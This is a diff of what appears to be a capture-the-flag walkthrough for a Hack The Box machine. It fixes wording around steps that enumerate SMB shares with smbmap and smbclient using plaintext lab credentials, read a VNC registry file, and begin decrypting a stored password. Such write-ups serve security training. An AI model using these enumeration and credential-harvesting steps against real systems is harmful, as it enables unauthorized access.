@@ -221,7 +221,7 @@ root@kali:~# smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
 	SYSVOL                                            	READ ONLY	Logon server share 
 ```
 
-In `\Data`, we have some interesting files.
+In `/Data`, we have some interesting files.
 ```shell
 root@kali:~# smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva -R data
 [+] IP: 10.10.10.182:445	Name: 10.10.10.182                                      
@@ -289,7 +289,7 @@ NT_STATUS_ACCESS_DENIED listing \Temps\*
 smb: \>
 ```
 
-In `IT/Temp/s.smith`, we can find a configuration file `VNC Install.reg`.<br>
+In `IT/Temp/s.smith`, we can find a configuration file `VNC Install.reg`.
 ```shell
 root@kali:~/IT/Temp/s.smith# cat 'VNC Install.reg'
 ��Windows Registry Editor Version 5.00
@@ -532,7 +532,7 @@ root@kali:~# smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
 	SYSVOL                                            	READ ONLY	Logon server share
 ```
 
-Alternatively, we can we `smbclient` as well(But it doesn't show the access permission).
+Alternatively, we can use `smbclient` as well(But it doesn't show the access permission).
 ```shell
 root@kali:~# smbclient -L 10.10.10.182 -U s.smith
 Enter WORKGROUP\s.smith's password: 
@@ -550,7 +550,7 @@ Enter WORKGROUP\s.smith's password:
 SMB1 disabled -- no workgroup available
 ```
 
-
+Then, take a look at the newly obtained share `Audit$`.
 ```shell
 root@kali:~# smbmap -H 10.10.10.182 -u s.smith -p sT333ve2 -R Audit$
 [+] IP: 10.10.10.182:445	Name: 10.10.10.182                                      
@@ -840,8 +840,8 @@ public static string DecryptString(string EncryptedString, string Key)
 		}
 ```
 
-To get the password to log in, we have to write a .NET code
-Actually, if we google, we can find someone's left the code here [https://dotnetfiddle.net/2RDoWz](https://dotnetfiddle.net/2RDoWz).
+To get the password to log in, we have to write the following .NET code.<br>
+Actually, if we google the encrypted password `BQO5l5Kj9MdErXx6Q6AGOw==`, we can find someone's left the code here [https://dotnetfiddle.net/2RDoWz](https://dotnetfiddle.net/2RDoWz).
 ```shell
 using System;
 using System.IO;
